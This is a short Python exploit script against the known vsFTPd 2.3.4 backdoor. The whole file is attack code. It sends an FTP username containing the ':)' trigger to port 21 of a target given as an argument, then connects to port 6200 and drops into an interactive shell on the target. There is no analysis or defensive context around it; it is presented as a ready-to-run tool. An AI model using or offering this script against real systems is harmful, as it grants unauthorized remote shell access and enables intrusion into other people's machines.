#!/bin/python3

from telnetlib import Telnet 
import argparse
from signal import signal, SIGINT
from sys import exit

def handler(signal_received, frame):
    # Handle any cleanup here
    print('   [+]Exiting...')
    exit(0)

signal(SIGINT, handler)                           
parser=argparse.ArgumentParser()        
parser.add_argument("host", help="input the address of the vulnerable host", type=str)
args = parser.parse_args()       
host = args.host                        
portFTP = 21 #if necessary edit this line

user="USER albaher:)"
password="PASS pass"

net = Telnet(host,portFTP)
net.read_until(b'(vsFTPd 2.3.4)')
net.write(user.encode('ascii') + b'\n')
net.read_until(b'password.')
net.write(password.encode('ascii') + b'\n')

backdoor = Telnet(host,6200)
print('Backdoor Opened!')
print('You May Succeed!')
backdoor.interact()
